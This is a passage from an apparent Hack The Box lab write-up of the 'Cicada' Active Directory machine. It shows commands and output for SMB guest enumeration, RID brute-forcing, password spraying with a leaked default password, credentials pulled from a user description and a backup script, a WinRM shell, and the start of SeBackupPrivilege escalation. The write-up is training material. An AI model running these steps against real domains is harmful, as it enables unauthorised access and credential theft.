</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
</span></span><span style="display:flex;"><span>|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
</span></span><span style="display:flex;"><span>|_SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
</span></span><span style="display:flex;"><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Not Found
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running <span style="color:#f92672">(</span>JUST GUESSING<span style="color:#f92672">)</span>: Microsoft Windows 2022|2012|<span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
</span></span><span style="display:flex;"><span>Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2012</span> R2 <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2016</span> <span style="color:#f92672">(</span>85%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Uptime guess: 0.007 days <span style="color:#f92672">(</span>since Fri Feb <span style="color:#ae81ff">14</span> 00:29:26 2025<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">262</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IP ID Sequence Generation: Incremental
</span></span><span style="display:flex;"><span>Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>I&rsquo;ll go ahead and update my <code>/etc/hosts</code> file with the information we gathered in the nmap scan:
<code>echo &quot;10.129.84.61    cicada.htb CICADA-DC.cicada.htb&quot; &gt;&gt; /etc/hosts</code></p>
<h3 id="smb">SMB</h3>
<p>It seems guest access to the SMB shares is enabled, lucky us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ smbmap -H 10.129.84.61 -d cicada.htb -u guest -p <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.129.84.61:445        Name: cicada.htb           Status: Authenticated
</span></span><span style="display:flex;"><span>        Disk                                 Permissions     Comment
</span></span><span style="display:flex;"><span>        ----                                 -----------     -------
</span></span><span style="display:flex;"><span>        ADMIN$                               NO ACCESS       Remote Admin
</span></span><span style="display:flex;"><span>        C$                                   NO ACCESS       Default share
</span></span><span style="display:flex;"><span>        DEV                                  NO ACCESS
</span></span><span style="display:flex;"><span>        HR                                   READ ONLY
</span></span><span style="display:flex;"><span>        IPC$                                 READ ONLY       Remote IPC
</span></span><span style="display:flex;"><span>        NETLOGON                             NO ACCESS       Logon server share 
</span></span><span style="display:flex;"><span>        SYSVOL                               NO ACCESS       Logon server share
</span></span></code></pre></div><p>We can connect to <code>DEV</code>, but do not have any READ access.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.84.61<span style="color:#ae81ff">\\</span>HR 
</span></span><span style="display:flex;"><span>Password <span style="color:#66d9ef">for</span> <span style="color:#f92672">[</span>WORKGROUP<span style="color:#ae81ff">\p</span>l4stic<span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> ls
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:29:09 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>  Notice from HR.txt                  A     <span style="color:#ae81ff">1266</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:31:48 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">416335</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Notice from HR.txt&#34;</span>
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\N</span>otice from HR.txt of size <span style="color:#ae81ff">1266</span> as Notice from HR.txt <span style="color:#f92672">(</span>12.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 12.0 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="notice-from-hrtxt">Notice from HR.txt</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Dear new hire!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Welcome to Cicada Corp! We&#39;re thrilled to have you join our team. As part of our security protocols, it&#39;s essential that you change your default password to something unique and secure.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Your default password is: Cicada$M6Corpb*@Lp#nZp!8
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>To change your password:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
</span></span><span style="display:flex;"><span>2. Once logged in, navigate to your account settings or profile settings section.
</span></span><span style="display:flex;"><span>3. Look for the option to change your password. This will be labeled as &#34;Change Password&#34;.
</span></span><span style="display:flex;"><span>4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
</span></span><span style="display:flex;"><span>5. After changing your password, make sure to save your changes.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>If you encounter any issues or need assistance with changing your password, don&#39;t hesitate to reach out to our support team at support@cicada.htb.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Best regards,
</span></span><span style="display:flex;"><span>Cicada Corp
</span></span></code></pre></div><h2 id="initial-access">Initial Access</h2>
<h3 id="user-enumeration">User Enumeration</h3>
<p>Remembering that we have guest access to SMB, let&rsquo;s try using <code>netexec</code> to enumerate the users on this machine. Unfortunately, the standard <code>--users</code> flag doesn&rsquo;t work, so we have to use <code>--rid-brute</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.84.61 -u guest -p <span style="color:#e6db74">&#39;&#39;</span> --rid-brute
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\g</span>uest: 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        500: CICADA<span style="color:#ae81ff">\A</span>dministrator <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        501: CICADA<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        502: CICADA<span style="color:#ae81ff">\k</span>rbtgt <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1000: CICADA<span style="color:#ae81ff">\C</span>ICADA-DC$ <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1104: CICADA<span style="color:#ae81ff">\j</span>ohn.smoulder <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1105: CICADA<span style="color:#ae81ff">\s</span>arah.dantelia <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1106: CICADA<span style="color:#ae81ff">\m</span>ichael.wrightson <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1108: CICADA<span style="color:#ae81ff">\d</span>avid.orelious <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...snip...<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        1601: CICADA<span style="color:#ae81ff">\e</span>mily.oscars <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Now we&rsquo;ve got a list of usernames&hellip; let&rsquo;s pull them out and place them in <code>users.txt</code>.</p>
<h3 id="password-spraying">Password Spraying</h3>
<p>Let&rsquo;s try that password from the file in the <code>HR</code> SMB share with all of the usernames we&rsquo;ve found. Looks like we have a new employee who hasn&rsquo;t changed his password yet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.84.61 -d cicada.htb -u users.txt -p <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\A</span>dministrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\G</span>uest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\k</span>rbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\C</span>ICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\j</span>ohn.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\s</span>arah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\m</span>ichael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
</span></span></code></pre></div><p>And a working set of credentials: <code>CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code></p>
<h3 id="bloodhound">Bloodhound</h3>
<p>Let&rsquo;s use our new credentials and take a look at the domain structure.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ bloodhound-python -c all -d cicada.htb -ns 10.129.84.61 -u michael.wrightson -p <span style="color:#e6db74">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span> 
</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>INFO: Found AD domain: cicada.htb
</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
</span></span><span style="display:flex;"><span>WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW<span style="color:#f92672">(</span>Clock skew too great<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: cicada-dc.cicada.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> computers
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: cicada-dc.cicada.htb
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">9</span> users
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">54</span> groups
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">3</span> gpos
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> ous
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
</span></span><span style="display:flex;"><span>INFO: Querying computer: CICADA-DC.cicada.htb
</span></span><span style="display:flex;"><span>INFO: Done in 00M 05S
</span></span></code></pre></div><p>Looking at the properties for the domain users, I found something very helpful in the &ldquo;Description&rdquo; for <code>david.orelious</code>.</p>
<p><img src="/images/cicada1.png" alt="cicada1"></p>
<p>Now we have another credential: <code>CICADA\david.orelious:aRt$Lp#7t*VQ!3</code></p>
<h3 id="smb-dev">SMB (DEV)</h3>
<p>Using the <code>david.orelious</code> credentials, we now have access to the <code>DEV</code> SMB share.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ netexec smb 10.129.84.61 -d cicada.htb -u david.orelious -p <span style="color:#e6db74">&#39;aRt$Lp#7t*VQ!3&#39;</span> --shares
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:CICADA-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cicada.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cicada.htb<span style="color:#ae81ff">\d</span>avid.orelious:aRt$Lp<span style="color:#75715e">#7t*VQ!3 </span>
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        DEV             READ            
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        HR              READ            
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        NETLOGON        READ            Logon server share 
</span></span><span style="display:flex;"><span>SMB         10.129.84.61    <span style="color:#ae81ff">445</span>    CICADA-DC        SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>Once we login, there&rsquo;s one file which we grab: <code>Backup_script.ps1</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ smbclient <span style="color:#ae81ff">\\\\</span>10.129.84.61<span style="color:#ae81ff">\\</span>DEV -U david.orelious%<span style="color:#e6db74">&#39;aRt$Lp#7t*VQ!3&#39;</span>
</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:31:39 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Mar <span style="color:#ae81ff">14</span> 08:21:29 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>  Backup_script.ps1                   A      <span style="color:#ae81ff">601</span>  Wed Aug <span style="color:#ae81ff">28</span> 13:28:22 <span style="color:#ae81ff">2024</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">4168447</span> blocks of size 4096. <span style="color:#ae81ff">435223</span> blocks available
</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get Backup_script.ps1
</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\B</span>ackup_script.ps1 of size <span style="color:#ae81ff">601</span> as Backup_script.ps1 <span style="color:#f92672">(</span>5.7 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 5.7 KiloBytes/sec<span style="color:#f92672">)</span>
</span></span></code></pre></div><h3 id="backup_scriptps1">Backup_script.ps1</h3>
<p>And would you look at that, another credential in the script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>$sourceDirectory = <span style="color:#e6db74">&#34;C:\smb&#34;</span>
</span></span><span style="display:flex;"><span>$destinationDirectory = <span style="color:#e6db74">&#34;D:\Backup&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$username = <span style="color:#e6db74">&#34;emily.oscars&#34;</span>
</span></span><span style="display:flex;"><span>$password = ConvertTo-SecureString <span style="color:#e6db74">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> -AsPlainText -Force
</span></span><span style="display:flex;"><span>$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
</span></span><span style="display:flex;"><span>$dateStamp = Get-Date -Format <span style="color:#e6db74">&#34;yyyyMMdd_HHmmss&#34;</span>
</span></span><span style="display:flex;"><span>$backupFileName = <span style="color:#e6db74">&#34;smb_backup_</span>$dateStamp<span style="color:#e6db74">.zip&#34;</span>
</span></span><span style="display:flex;"><span>$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
</span></span><span style="display:flex;"><span>Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Backup completed successfully. Backup file saved to: </span>$backupFilePath<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><p><code>CICADA\emily.oscars:Q!3@Lp#M6b*7t*Vt</code></p>
<h3 id="shell-as-emilyoscars">Shell as emily.oscars</h3>
<p>From our Bloodhound enumeration, we noticed <code>emily.oscars</code> has <code>CanPSRemote</code> access to the machine.</p>
<p><img src="/images/cicada2.png" alt="cicada2"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/cicada<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.84.61 -u emily.oscars -p <span style="color:#e6db74">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\e</span>mily.oscars.CICADA<span style="color:#ae81ff">\D</span>ocuments&gt;
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="enumeration">Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\&gt; whoami /priv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
</span></span><span style="display:flex;"><span>----------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Privilege Name                Description                    State
</span></span><span style="display:flex;"><span>============================= ============================== =======
</span></span><span style="display:flex;"><span>SeBackupPrivilege             Back up files and directories  Enabled
</span></span><span style="display:flex;"><span>SeRestorePrivilege            Restore files and directories  Enabled
</span></span><span style="display:flex;"><span>SeShutdownPrivilege           Shut down the system           Enabled
</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a <span style="color:#66d9ef">process</span> working set Enabled
</span></span></code></pre></div><p>Looks like Emily has both the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>, which are good possibilities for privilege escalation.</p>
<h3 id="sebackupprivilege">SeBackupPrivilege</h3>
<p>I found a nice article <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank">here</a> that outlines how to take advantage of the <code>SeBackupPrivilege</code> to make copies of the <code>SAM</code> and <code>SYSTEM</code> files, in order to extract secrets from the machine.</p>
